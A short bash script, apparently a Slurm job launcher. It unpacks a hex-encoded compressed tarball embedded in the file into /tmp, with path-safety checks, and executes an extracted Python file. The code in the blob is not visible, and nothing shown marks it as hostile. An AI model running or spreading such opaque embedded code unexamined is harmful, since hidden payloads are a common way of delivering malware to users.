#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d6fdb300c867bf6af1072910d048afc2da7c871f71db65d86a2901d3a569ad886a4accd86fdf74976506428b05bdb0de37388225b7c4991a2ccd9de0cfdcdabc21d05e7d3c85f8e3c4db3e7fff3f3a22cca1bc25f37ac9993b1523b976fe1eb2fe4c7c20e0fd02fd664216b1e27699617a5a8164bb218e5f930c8edbde96492177e459cb6221345de6465920307c8f25cb4b26c4599b46dca33512729cf5351973c4913294455e63588864bd154bcbd56adcf168c13cdb338ad92dcbf39c8feca59cd2b2821175038355e3795a8aaa4ad9a526cb7a98c534863e722e6129a266992580077f1d75224e0c2d8168b9fef9ddb7f01cec6f3abfbf873ffc771fca2ffb32cc5fe7f0bd4711cb425e66c96fe43b0eca4e90eaa5ebaa4b4ea0041ab872319a5f50fc965f147370df4c60fa1336452efbe7d8defa2db66e33598ef6f13867a45f9f475a111d3e05adec2930da32890b3295d8d7ad8436357cd703c9e7a65cfabfdfe0ca77e47a355f3954e3713bdf33276f79d06d21870ee2f21b2f9aa08e52c3edd274e9d75f0b4553b30ced566e3547ebfc6e85df0a86c472efb63c3087d2823220db1eb80b4832640543f4d886a493f5802ac974760fea058e3ad433ae8a6937a7bdfc57c45a37533f456f527b8b651c63b0823e2242963d4ab4efb9ee522367ab9b596ca00f9220f27f8a0f5a043fab937b2f5418c274b2327396e5c2a47ba9a0d6f476f09bd65c787add2e13c319b4ffa044b7852c6de0f0fd32c724b1fb5b270498e65ae005a36760a0ce6aaf882f822fa1a33d5fb0c877c69ac0e27a7eeed7404ae36ccf6c3f351384ad507fe27d451f0de671941100441100441100441100441100441100441100441fe577e013d5ec15000280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
